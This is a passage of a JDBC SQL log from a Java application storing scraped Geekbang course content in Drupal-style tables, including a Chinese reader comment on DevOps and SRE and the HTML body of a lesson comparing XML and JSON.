field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.047 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:01:03.048 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-11 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 全栈其实就如老师开始的定位：万事皆会万事皆能，就像我们通常会说“万能的运维”；运维为何万能-其实就是因为知识的全栈，如同SRE一样，老师提及SRE时似乎漏了一块-DevOps，个人通过对全栈的梳理强化了开发和网络方面的根基。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;Ops从业多年其实就更能切身感受到其中的问题：设备不多的话OPS的工作蛮鸡肋不如直接上云，多了就必须用自动化或者AI，不然的话事情做不完。11月国内GOPS 
大会让我深深的感受到了OPS这种变革其实同样是我内心对这个职业切身的感受，尤其参会过程中的学习交流。 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Google的SRE看完时就想到了书中提及的DevOps：那本书关于这块不知道是翻译的问题还是针对了特定场景，单纯的解释网站稳定工程师有疏漏。个人在学习的过程中同时在学DevOps，刚好可以把这些年Ops沉淀的东西用上。极客时间的&lt;DevOps实战笔记&gt;一直在同步跟着学习，算是后期自己的一个方向吧。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 👍</p> </div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li>', 0, 'full_html', 'zh-hans', 
5, 5) 
 {executed in 1 msec}
2020-11-19 11:01:03.051 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=5 
 {executed in 1 msec}
2020-11-19 11:01:03.051 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:01:03.052 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-11 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 全栈其实就如老师开始的定位：万事皆会万事皆能，就像我们通常会说“万能的运维”；运维为何万能-其实就是因为知识的全栈，如同SRE一样，老师提及SRE时似乎漏了一块-DevOps，个人通过对全栈的梳理强化了开发和网络方面的根基。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;Ops从业多年其实就更能切身感受到其中的问题：设备不多的话OPS的工作蛮鸡肋不如直接上云，多了就必须用自动化或者AI，不然的话事情做不完。11月国内GOPS 
大会让我深深的感受到了OPS这种变革其实同样是我内心对这个职业切身的感受，尤其参会过程中的学习交流。 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Google的SRE看完时就想到了书中提及的DevOps：那本书关于这块不知道是翻译的问题还是针对了特定场景，单纯的解释网站稳定工程师有疏漏。个人在学习的过程中同时在学DevOps，刚好可以把这些年Ops沉淀的东西用上。极客时间的&lt;DevOps实战笔记&gt;一直在同步跟着学习，算是后期自己的一个方向吧。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 👍</p> </div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li>', 0, 'full_html', 'zh-hans', 
5, 5) 
 {executed in 0 msec}
2020-11-19 11:01:03.055 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.056 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:01:03.056 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.057 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:01:03.058 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 5, 'https://static001.geekbang.org/resource/image/9e/25/9e2b5c23c4aa65e5493a2e701751ab25.jpg', 
5) 
 {executed in 0 msec}
2020-11-19 11:01:03.062 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.062 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:01:03.063 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 5, 'https://static001.geekbang.org/resource/image/9e/25/9e2b5c23c4aa65e5493a2e701751ab25.jpg', 
5) 
 {executed in 0 msec}
2020-11-19 11:01:03.066 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.067 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:01:03.068 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 5, 5) 
 {executed in 1 msec}
2020-11-19 11:01:03.071 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.071 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:01:03.072 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 5, 5) 
 {executed in 0 msec}
2020-11-19 11:02:00.911 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='422799924080370' 
 {executed in 0 msec}
2020-11-19 11:02:00.912 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:02:00.915 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605754920, 1) 
 {executed in 1 msec}
2020-11-19 11:02:00.916 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605754920, 1) 
 {executed in 0 msec}
2020-11-19 11:02:00.916 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|6             |
|--------------|

2020-11-19 11:02:00.943 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', '7aaef5f8-0c33-483d-aedc-8747a34858ae', 
6) 
 {executed in 0 msec}
2020-11-19 11:02:00.944 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', '7aaef5f8-0c33-483d-aedc-8747a34858ae', 6) 
 {executed in 0 msec}
2020-11-19 11:02:00.944 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|6             |
|--------------|

2020-11-19 11:02:00.950 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=6, revision_default=1, revision_timestamp=1605754920, 
revision_uid=1 where vid=6 
 {executed in 0 msec}
2020-11-19 11:02:00.955 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:00.956 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:02:00.957 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '422799924080370', 'zh-hans', 6, 6) 
 {executed in 0 msec}
2020-11-19 11:02:00.964 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=6 
 {executed in 1 msec}
2020-11-19 11:02:00.964 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:02:00.965 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '422799924080370', 'zh-hans', 6, 6) 
 {executed in 0 msec}
2020-11-19 11:02:00.969 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=6 
 {executed in 0 msec}
2020-11-19 11:02:00.969 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:02:00.970 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=6 
 {executed in 0 msec}
2020-11-19 11:02:00.971 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:02:00.971 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 4, 6, 0, 0, 4, 0, 6) 
 {executed in 0 msec}
2020-11-19 11:02:00.978 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:00.979 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:02:00.979 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=6 
 {executed in 0 msec}
2020-11-19 11:02:00.980 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:02:01.001 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="2339" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-1310cd02 " data-slate-type="paragraph" data-slate-object="block" 
data-key="2340"> <span data-slate-object="text" data-key="2341"><span data-slate-leaf="true" 
data-offset-key="2341:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-cf537f58 " data-slate-type="paragraph" data-slate-object="block" data-key="2342"> 
<span data-slate-object="text" data-key="2343"><span data-slate-leaf="true" data-offset-key="2343:0" 
data-first-offset="true"><span data-slate-string="true">XML 和 JSON，是程序员几乎每天都会打交道的数据、特别是配置数据的承载格式。我想你心里应该有一个大致的印象，它们二者各有什么优劣，但是也许没有系统地比较过。那今天我们就把它们放到一起，丁是丁卯是卯地分析分析，对比一下它们各自的特点。另外，这些年来，对于配置，特别是复杂 
DSL 的配置，YAML 也逐渐流行开来，因此我们也把它拿过来剖析一番。</span></span></span> </div> <h2 class="se-c3225a1f" data-slate-type="heading" 
data-slate-object="block" data-key="2344"><span data-slate-object="text" data-key="2345"><span 
data-slate-leaf="true" data-offset-key="2345:0" data-first-offset="true"><span data-slate-string="true">XML 
和 JSON 的比较</span></span></span></h2> <div class="se-8db7f6f7 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2346"> <span data-slate-object="text" data-key="2347"><span 
data-slate-leaf="true" data-offset-key="2347:0" data-first-offset="true"><span data-slate-string="true">XML 
全称叫做 Extensible Markup Language，就像 HTML、CSS 一样，是一种标记语言（标记语言不属于传统意义上的编程语言），且是一种具备结构化特征的数据交换语言；类似地，JSON，也就是 
JavaScript Object Notation，被称作 JavaScript 对象表示法，非结构化，更轻量，但归根结底也是一种数据交换语言。因此，二者具备相当程度的相似性，在实际应用中，往往也可以比较和替代。</span></span></span> 
</div> <h3 class="se-afa0f8e1" data-slate-type="heading" data-slate-object="block" data-key="2348"><span 
data-slate-object="text" data-key="2349"><span data-slate-leaf="true" data-offset-key="2349:0" 
data-first-offset="true"><span data-slate-string="true">1. 简洁还是严谨</span></span></span></h3> 
<div class="se-cd850df0 " data-slate-type="paragraph" data-slate-object="block" data-key="2350"> 
<span data-slate-object="text" data-key="2351"><span data-slate-leaf="true" data-offset-key="2351:0" 
data-first-offset="true"><span data-slate-string="true">在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2352" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" 
data-key="2353"><span data-slate-leaf="true" data-offset-key="2353:0" data-first-offset="true"><span 
data-slate-string="true">[第 04 讲]</span></span></span></a><span data-slate-object="text" data-key="2354"><span 
data-slate-leaf="true" data-offset-key="2354:0" data-first-offset="true"><span data-slate-string="true"> 
的时候，我介绍了 REST 和 SOAP 这样一个简洁、一个严谨的俩兄弟。而在本讲中，JSON 和 XML 也在一定程度上同样满足这样的比较关系，JSON 往往是更为简洁、快速的那一个，而 
XML 则更为严谨、周全。</span></span></span> </div> <div class="se-43666656 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2355"> <span data-slate-object="text" data-key="2356"><span 
data-slate-leaf="true" data-offset-key="2356:0" data-first-offset="true"><span data-slate-string="true">我们来看一个简单的例子，id 
为 1 的城市北京：</span></span></span> </div> <div class="se-60f00485 se-8e1eae14" data-slate-type="pre" 
data-slate-object="block" data-key="2357" data-code-language="javascript"> <div class="se-9eedb5b6 
se-0113d8d7"> <span></span> </div> <div class="se-0bcc8057"> <div class="se-2334fb14 se-b056eacb" 
data-code-line-number="1"></div> <div class="se-2334fb14 se-b056eacb" data-code-line-number="2"></div> 
<div class="se-2334fb14 se-b056eacb" data-code-line-number="3"></div> <div class="se-2334fb14 
se-b056eacb" data-code-line-number="4"></div> <div class="se-2334fb14 se-b056eacb" data-code-line-number="5"></div> 
</div> <div class="se-f1068f88 ps"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="2358"> <span data-slate-object="text" data-key="2359"><span 
data-slate-leaf="true" data-offset-key="2359:0" data-first-offset="true"><span data-slate-string="true">&lt;?xml 
version=</span></span><span data-slate-leaf="true" data-offset-key="2359:1"><span class=" gkhl-string" 
data-slate-object="annotation" data-annotation-key="gkann_5522759797" data-annotation-type="annotation"><span 
data-slate-string="true">"1.0"</span></span></span><span data-slate-leaf="true" data-offset-key="2359:2"><span 
data-slate-string="true"> encoding=</span></span><span data-slate-leaf="true" data-offset-key="2359:3"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_8694490961" 
data-annotation-type="annotation"><span data-slate-string="true">"UTF-8"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2359:4"><span data-slate-string="true"> ?&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2360"> <span data-slate-object="text" data-key="2361"><span data-slate-leaf="true" 
data-offset-key="2361:0" data-first-offset="true"><span data-slate-string="true">&lt;city&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2362"> <span data-slate-object="text" data-key="2363"><span data-slate-leaf="true" 
data-offset-key="2363:0" data-first-offset="true"><span data-slate-string="true"> &lt;name&gt;Beijing&lt;/name&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2364"> <span data-slate-object="text" data-key="2365"><span data-slate-leaf="true" 
data-offset-key="2365:0" data-first-offset="true"><span data-slate-string="true"> &lt;id&gt;1&lt;id&gt;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2366"> <span data-slate-object="text" data-key="2367"><span data-slate-leaf="true" 
data-offset-key="2367:0" data-first-offset="true"><span data-slate-string="true">&lt;/city&gt;</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-06d200ad " data-slate-type="paragraph" data-slate-object="block" data-key="2368"> 
<span data-slate-object="text" data-key="2369"><span data-slate-leaf="true" data-offset-key="2369:0" 
data-first-offset="true"><span data-slate-string="true">如果用 JSON 表示：</span></span></span> </div> 
<div class="se-9d4e461c se-f65b62b0" data-slate-type="pre" data-slate-object="block" data-key="2370" 
data-code-language="javascript"> <div class="se-8203323c se-7137710b"> <span></span> </div> 
<div class="se-0545c819"> <div class="se-68ee3d0c se-ff7769d3" data-code-line-number="1"></div> 
<div class="se-68ee3d0c se-ff7769d3" data-code-line-number="2"></div> <div class="se-68ee3d0c 
se-ff7769d3" data-code-line-number="3"></div> <div class="se-68ee3d0c se-ff7769d3" data-code-line-number="4"></div> 
<div class="se-68ee3d0c se-ff7769d3" data-code-line-number="5"></div> <div class="se-68ee3d0c 
se-ff7769d3" data-code-line-number="6"></div> </div> <div class="se-762e9729 ps"> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="2371"> <span data-slate-object="text" 
data-key="2372"><span data-slate-leaf="true" data-offset-key="2372:0" data-first-offset="true"><span 
data-slate-string="true">{</span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="2373"> <span data-slate-object="text" 
data-key="2374"><span data-slate-leaf="true" data-offset-key="2374:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="2374:1"><span 
class=" gkhl-string" data-slate-object="annotation" data-annotation-key="gkann_7217993161" 
data-annotation-type="annotation"><span data-slate-string="true">"city"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2374:2"><span data-slate-string="true">: {</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2375"> <span data-slate-object="text" data-key="2376"><span data-slate-leaf="true" 
data-offset-key="2376:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2376:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_4600783011" data-annotation-type="annotation"><span data-slate-string="true">"name"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2376:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2376:3"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_5178591359" data-annotation-type="annotation"><span data-slate-string="true">"Beijing"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2376:4"><span data-slate-string="true">,</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2377"> <span data-slate-object="text" data-key="2378"><span data-slate-leaf="true" 
data-offset-key="2378:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2378:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_8328550213" data-annotation-type="annotation"><span data-slate-string="true">"id"</span></span></span><span 
data-slate-leaf="true" data-offset-key="2378:2"><span data-slate-string="true">: </span></span><span 
data-slate-leaf="true" data-offset-key="2378:3"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_4223288755" data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2379"> <span data-slate-object="text" data-key="2380"><span data-slate-leaf="true" 
data-offset-key="2380:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="2381"> <span data-slate-object="text" data-key="2382"><span data-slate-leaf="true" 
data-offset-key="2382:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-fb7fda24 " data-slate-type="paragraph" data-slate-object="block" data-key="2383"> 
<span data-slate-object="text" data-key="2384"><span data-slate-leaf="true" data-offset-key="2384:0" 
data-first-offset="true"><span data-slate-string="true">你可能会说，除了 XML tag 的名字，在 JSON 中只需要写一遍以外，看起来复杂复杂、严谨的程度似乎也差不太多啊。</span></span></span> 
</div> <div class="se-44b9c051 " data-slate-type="paragraph" data-slate-object="block" data-key="2385"> 
<span data-slate-object="text" data-key="2386"><span data-slate-leaf="true" data-offset-key="2386:0" 
data-first-offset="true"><span data-slate-string="true">别急，往下看。XML 的结构，强制要求每一个内容数据，都必须具备能够说明它的结构，而 
JSON 则没有这样的要求。比方说，如果我们把城市组成数组，用 XML 来表示，请你把这个文件存成 cities.xml，因为我们会多次用到这个文件：</span></span></span> 
</div> <div class="se-2e9ab12f se-994a1776" data-slate-type="pre" data-slate-object="block" 
data-key="2387" data-code-language="javascript"> <div class="se-86b5a6d3 se-3cbac57f"> <span></span> 
</div> <div class="se-699debf3"> <div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="1"></div> 
<div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="2"></div> <div class="se-9fe4a25d 
se-5dfcb43c" data-code-line-number="3"></div> <div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="4"></div> 
<div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="5"></div> <div class="se-9fe4a25d 
se-5dfcb43c" data-code-line-number="6"></div> <div class="se-9fe4a25d se-5dfcb43c" data-code-line-number="7"></div> 
